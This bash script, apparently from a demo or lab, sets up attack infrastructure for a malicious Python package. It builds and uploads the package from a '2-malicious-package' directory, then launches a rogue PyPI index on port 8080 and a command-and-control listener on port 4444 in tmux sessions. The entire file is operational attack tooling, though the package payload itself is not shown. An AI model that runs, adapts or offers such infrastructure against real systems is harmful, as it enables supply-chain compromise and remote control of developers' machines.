#!/bin/bash
# Quick Demo Setup - Start C2 Infrastructure
# Usage: ./quick_demo.sh <C2_IP>

set -e

if [ -z "$1" ]; then
    echo "Usage: $0 <C2_SERVER_IP>"
    echo "Example: $0 192.168.0.236"
    exit 1
fi

C2_IP="$1"
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

echo "=========================================="
echo "  Quick Demo Setup"
echo "=========================================="
echo ""
echo "[*] C2 Server IP: $C2_IP"
echo ""

# Fix line endings if needed
echo "[*] Checking script permissions..."
chmod +x "$DIR"/*.sh
chmod +x "$DIR/../2-malicious-package"/*.sh 2>/dev/null || true

# Build malicious package
echo "[*] Building malicious package..."
cd "$DIR/../2-malicious-package"
./build_and_upload.sh "$C2_IP"

if [ $? -ne 0 ]; then
    echo "[-] Package build failed!"
    exit 1
fi

cd "$DIR"

# Check if tmux is available
if command -v tmux &> /dev/null; then
    echo ""
    echo "[*] Starting servers with tmux..."
    
    # Kill existing sessions if they exist
    tmux kill-session -t pypi 2>/dev/null || true
    tmux kill-session -t c2 2>/dev/null || true
    
    # Start PyPI server in tmux
    tmux new-session -d -s pypi "cd '$DIR' && ./start_pypi_only.sh $C2_IP"
    sleep 1
    
    # Start C2 listener in tmux
    tmux new-session -d -s c2 "cd '$DIR' && ./start_c2_only.sh $C2_IP"
    sleep 1
    
    echo ""
    echo "=========================================="
    echo "  [SUCCESS] C2 Infrastructure Ready!"
    echo "=========================================="
    echo ""
    echo "PyPI Server: http://$C2_IP:8080/simple/"
    echo "C2 Listener: Port 4444"
    echo ""
    echo "View server logs:"
    echo "  PyPI:  tmux attach -t pypi"
    echo "  C2:    tmux attach -t c2"
    echo "  (Press Ctrl+B then D to detach)"
    echo ""
    echo "Stop servers:"
    echo "  tmux kill-session -t pypi"
    echo "  tmux kill-session -t c2"
    echo ""
else
    echo ""
    echo "[!] tmux not found - Manual startup required"
    echo ""
    echo "Terminal 1 (PyPI Server):"
    echo "  cd $DIR && ./start_pypi_only.sh $C2_IP"
    echo ""
    echo "Terminal 2 (C2 Listener):"
    echo "  cd $DIR && ./start_c2_only.sh $C2_IP"
    echo ""
fi
